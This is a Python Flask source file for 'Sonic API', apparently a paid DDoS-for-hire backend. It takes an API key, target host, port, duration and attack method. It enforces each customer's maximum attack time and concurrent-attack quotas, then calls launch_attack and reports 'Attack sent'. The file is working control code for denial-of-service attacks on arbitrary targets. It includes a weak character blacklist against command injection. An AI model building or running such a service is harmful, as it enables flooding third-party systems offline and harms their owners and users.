import json, os, threading, requests

from flask import *
from assets.parse_attack import *
from assets.launch_attack import *

app = Flask(__name__)
os.system("cls" if os.name == "nt" else "clear")

def set_conc(key):
	with open("./database/userdata.json", "r+") as usdata:
		userdata = json.load(usdata)
	userdata[key]["curCons"] -= 1
	with open("./database/userdata.json", "w") as data:
		json.dump(userdata, data)

@app.route("/")
def index_page():
	return "Welcome to Sonic API!"

@app.route("/api")
def api_page():
	key = request.args.get("key")
	host = request.args.get("host")
	port = request.args.get("port")
	time = request.args.get("time")
	method = request.args.get("method")

	with open("./database/methods.json", "r+") as mthds:
		methods = json.load(mthds)
	with open("./database/userdata.json", "r+") as usdata:
		userdata = json.load(usdata)
	with open("./database/illegal_chars.json", "r+") as ich:
		illegal = json.load(ich)

	if key == None or host == None or port == None or time == None or method == None:
		return "Please fill all the parameter!"
	if key == "" or host == "" or port == "" or time == "" or method == "":
		return "Please fill all the parameter!"

	if not userdata.get(key):
		return "Error, Invalid api key!"
	if method.upper() not in methods:
		return "Error, Invalid method attack!"

	# Dont delete this function (Prevent RCE's exploit)
	for x in host:
		for z in port:
			for f in range(0, len(illegal)):
				if x in illegal[f]:
					return "Error, Malicious character detected!"
				elif z in illegal[f]:
					return "Error, Malicious character detected!"

	# Attack times, Concurrent, Expiry validation
	try:
		if int(time) > userdata[key]["time"]:
			return "Error, Maximum attack time is {0} seconds!".format(userdata[key]["time"])
		elif int(time) < 10:
			return "Error, Minimum attack time is 10 seconds!"
	except:
		return "Error, Time must be an integer!"
	if userdata[key]["curCons"] >= userdata[key]["maxCons"]:
		return 'Error, You"ve reached max concurrent limit!'

	userdata[key]["curCons"] += 1
	with open("./database/userdata.json", "w") as data:
		json.dump(userdata, data)
	threading.Timer(int(time), set_conc, args = (str(key),)).start()
	launch_attack(method, host, port, time)

	return "Attack sent to {0}:{1} for {2} seconds with {3}!".format(host, port, time, method.upper())

app.run(host = "0.0.0.0", port = 80)